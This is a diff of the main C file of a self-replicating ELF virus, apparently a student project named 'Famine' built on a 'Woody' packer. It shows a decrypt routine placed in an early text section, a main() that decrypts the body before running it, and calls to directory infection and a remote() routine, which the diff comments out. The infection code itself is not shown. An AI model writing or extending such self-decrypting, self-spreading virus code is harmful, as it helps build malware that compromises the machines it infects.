@@ -4,16 +4,15 @@
 #include "lib/infect.h"
 #include "virus_pos.h"
 
-int __attribute__((section (".textearly"))) main(int ac, char **av) asm ("entry");
+int main(int ac, char **av) asm ("entry");
 int __attribute__((section (".textearly"))) decrypt();
-
-extern size_t virus_addr;
-extern size_t virus_length;
 
 //======================= WOODY ==============================
 
-extern size_t crypt_off;
-extern size_t crypt_length;
+extern struct s_opt opt;
+
+extern char is_recur;
+extern char is_remote;
 
 extern char test_area;
 
@@ -37,7 +36,7 @@ void decrypt_block(uint32_t* v, uint32_t *k) {
 
 extern void decrypt_block_asm(uint32_t *v, uint32_t *k);
 
-int decrypt(){
+int __attribute__((section (".textearly"))) decrypt(){
         char *s = ((char*)&crypt_start);
         uint64_t n = ((size_t)&crypt_end) - ((size_t)&crypt_start);
         for (uint64_t i = 0; i < n; i += 8){
@@ -51,22 +50,21 @@ int decrypt(){
 //=============================================================
 
 int virus(int ac, char **av){
-	println("Hello, I am Famine X");
+	println("Hello, I am Famine");
 
 	//check test_start is full of '0'
-	for (int i = 0; i < 8; i++)
+	/*
+		for (int i = 0; i < 8; i++)
 		if ((&test_area)[i] != 'A')
 			return (1);
-	
-	println("Hello, I am Famine");
-	
-	infect_dir("/tmp/test");
+	*/
+	//infect_dir("/tmp/test");
 	//infect("/tmp/test2", "/tmp/test2", (void*)&bin_start, (size_t)&bin_end - (size_t)&bin_start);
 
- 	remote();
+ 	//remote();
 }
 
-int main(int ac, char **av){
+int __attribute__((section (".textearly"))) main(int ac, char **av){
 	if (decrypt())
 		virus(ac, av);
 }
